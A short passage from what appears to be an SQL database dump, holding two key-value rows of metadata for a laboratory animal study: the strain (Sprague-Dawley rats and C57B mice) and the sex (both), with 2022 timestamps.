	(7119,177,'strain','\"Sprague-Dawley rats and C57B mice\"','2022-03-31 13:23:48','2022-03-31 13:23:48'),
	(7120,177,'sex','\"both\"','2022-03-31 13:23:48','2022-03-31 13:23:48'),
